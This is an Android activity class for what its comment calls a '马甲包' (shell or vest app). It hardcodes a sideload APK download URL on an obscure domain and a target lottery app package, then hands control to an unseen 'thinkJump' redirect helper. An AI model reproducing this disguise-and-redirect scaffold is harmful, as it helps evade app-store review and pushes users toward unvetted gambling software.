package com.regus.entrance.activity;

import android.os.Bundle;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;

import com.regus.entrance.R;
import com.regus.mj.utils.KgUtils;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

public class MaJiaActivity extends AppCompatActivity {
    public static final String TAG = "Line  ";
    ImageView ivHome;
    ImageView ivBook;
    ImageView iv_sx;
    ImageView ivMy;
    ImageView iv_zx;

    TextView tvHome;
    TextView tvBook;
    TextView tv_sx;
    TextView tvMy;
    TextView tv_zx;

    LinearLayout llBottom;


    private String mUrl; //马甲包h5的链接

    public String mAimUrl;

    private String mDownLoadAPkUrl = "http://www.qx6r2z.top/index/down/id/183163.html";

    private String aimPackage = "com.ttc.lottery";

    private boolean isDownLoadApk;
    private boolean isJumpH5;
    private RelativeLayout mRoot;


    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.acitivity_spash_scene);

        KgUtils.thinkJump(this);

    }






}
